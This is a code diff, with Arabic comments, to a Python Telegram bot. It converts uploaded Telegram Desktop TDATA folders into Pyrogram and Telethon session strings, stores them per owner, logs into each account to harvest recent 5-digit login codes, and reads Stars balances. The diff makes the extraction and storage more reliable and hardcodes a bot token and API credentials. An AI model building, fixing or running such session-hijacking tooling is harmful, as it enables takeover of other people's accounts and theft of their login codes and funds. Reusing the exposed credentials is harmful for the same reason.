@@ -30,7 +30,7 @@ def radar_exception_handler(exctype, value, tb):
 sys.excepthook = radar_exception_handler
 
 # =========================================================
-# 🛠️ ترقيعة بايثون 3.14 (حل مشكلة الـ Event Loop)
+# 🛠️ ترقيعة بايثون (حل مشكلة الـ Event Loop)
 # =========================================================
 try:
     asyncio.get_event_loop()
@@ -44,26 +44,35 @@ from pyrogram.enums import ChatType
 from pyrogram.errors import FloodWait, AuthKeyUnregistered, SessionRevoked
 from telethon.sessions import StringSession
 from telethon.crypto import AuthKey
+from telethon import TelegramClient as OfficialTelethonClient # 🛡️ العميل الرسمي لتجاوز أخطاء TDATA
 
 # المكتبة المتخصصة لفك تشفير TDATA
 try:
     from opentele.td import TDesktop
-    from opentele.tl import TelegramClient as OpenteleClient
     OPENTELE_AVAILABLE = True
 except ImportError:
     OPENTELE_AVAILABLE = False
-    logging.warning("⚠️ مكتبة 'opentele' غير مثبتة! استخراج الـ TDATA الرسمي قد يفشل. يرجى كتابة: pip install opentele")
+    logging.warning("⚠️ مكتبة 'opentele' غير مثبتة! يرجى كتابة: pip install opentele")
+except Exception as e:
+    OPENTELE_AVAILABLE = False
+    logging.warning(f"⚠️ خطأ في تحميل مكتبة opentele: {e}")
 
 # --- المتغيرات ---
 API_ID = 28797361  
 API_HASH = "771041b32e83ab232e066b7adeee700b"  
-BOT_TOKEN = "8971197244:AAEBSUdjMuKWs7U1qHfU042gGFYhbkn5HVU"  # ⚠️ ضع التوكن هنا
+BOT_TOKEN = "8971197244:AAEBSUdjMuKWs7U1qHfU042gGFYhbkn5HVU"  # ⚠️ لا تنسَ وضع توكن البوت الحقيقي هنا مثل: 1234:AAH...
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# --- قاعدة البيانات ---
+# =========================================================
+# 🗄️ إدارة قواعد البيانات (تم إضافة حماية ضد تداخل المعالجات Thread Safety)
+# =========================================================
+def get_db_conn():
+    # check_same_thread=False يمنع انهيار البوت عند استخدامه من قبل عدة مستخدمين بنفس الوقت
+    return sqlite3.connect('accounts.db', check_same_thread=False, timeout=20)
+
 def init_db():
-    conn = sqlite3.connect('accounts.db')
+    conn = get_db_conn()
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS sessions 
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, 
@@ -72,7 +81,7 @@ def init_db():
     conn.close()
 
 def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars):
-    conn = sqlite3.connect('accounts.db')
+    conn = get_db_conn()
     c = conn.cursor()
     c.execute("INSERT INTO sessions (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
               (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars))
@@ -80,7 +89,7 @@ def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session,
     conn.close()
 
 def get_all_accounts(owner_id):
-    conn = sqlite3.connect('accounts.db')
+    conn = get_db_conn()
     c = conn.cursor()
     c.execute("SELECT id, phone, first_name, stars FROM sessions WHERE owner_id=?", (owner_id,))
     rows = c.fetchall()
@@ -88,7 +97,7 @@ def get_all_accounts(owner_id):
     return rows
 
 def get_account(acc_id):
-    conn = sqlite3.connect('accounts.db')
+    conn = get_db_conn()
     c = conn.cursor()
     c.execute("SELECT * FROM sessions WHERE id=?", (acc_id,))
     row = c.fetchone()
@@ -96,7 +105,7 @@ def get_account(acc_id):
     return row
 
 def delete_account(acc_id):
-    conn = sqlite3.connect('accounts.db')
+    conn = get_db_conn()
     c = conn.cursor()
     c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
     conn.commit()
@@ -196,6 +205,7 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
     for acc in accounts:
         acc_id, phone, name, stars = acc
         target_acc = get_account(acc_id)
+        if not target_acc: continue
         pyro_session = target_acc[5]
 
         exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
@@ -206,9 +216,9 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
                     match = re.search(r'\b(\d{5})\b', msg.text)
                     if match:
                         found_codes.append((phone, match.group(1)))
-                        break  # تم إيجاد أحدث كود لهذا الحساب، ننتقل للحساب التالي
+                        break  
         except:
-            pass  # تجاهل الحسابات المحظورة أو المعطلة
+            pass  
         finally:
             if exec_client.is_connected:
                 await exec_client.disconnect()
@@ -306,7 +316,7 @@ def generate_sessions(api_id, dc_id, auth_key_bytes):
     session._dc_id, session._server_address, session.port, session._auth_key = dc_id, get_dc_ip(dc_id), 443, AuthKey(auth_key_bytes)
     return pyro_session, session.save()
 
-# 1. الاستخراج من TDATA الرسمي عبر Opentele (متخصص)
+# 1. الاستخراج من TDATA الرسمي (مع الحل الجذري لمشكلة unexpected keyword)
 async def extract_tdata_official(base_dir):
     if not OPENTELE_AVAILABLE: return None, None
     # البحث عن مجلد TDATA الحقيقي داخل الملف المرفوع
@@ -320,7 +330,9 @@ async def extract_tdata_official(base_dir):
     try:
         tdesk = TDesktop(tdata_path)
         if not tdesk.isLoaded(): return None, None
-        tl_client = await tdesk.ToTelethon(session="memory", client=OpenteleClient, api_id=API_ID, api_hash=API_HASH)
+        
+        # 🛡️ إجبار استخدام عميل Telethon الرسمي لمنع الانهيار
+        tl_client = await tdesk.ToTelethon(session="memory", client=OfficialTelethonClient, api_id=API_ID, api_hash=API_HASH)
         await tl_client.connect()
         dc_id = tl_client.session.dc_id
         auth_key = tl_client.session.auth_key.key
@@ -371,11 +383,16 @@ async def verify_and_save_async(owner_id, dc_id, auth_key, stype):
     await client.connect()
     me = await client.get_me()
     phone, first_name = me.phone_number or "Unknown", me.first_name or "User"
+    
+    # 🛡️ حماية من تعطل البوت بسبب إصدارات Pyrogram القديمة التي لا تدعم النجوم
     try:
         from pyrogram.raw.functions.payments import GetStarsStatus
         res = await client.invoke(GetStarsStatus(peer=await client.resolve_peer("me")))
         stars = getattr(res, "balance", 0)
-    except: stars = 0
+    except Exception as e:
+        logging.debug(f"تجاوز جلب النجوم: {e}")
+        stars = 0
+        
     await client.disconnect()
     save_account(owner_id, phone, me.id, first_name, pyro_session, tl_session, stype, stars)
     return phone, first_name, stars
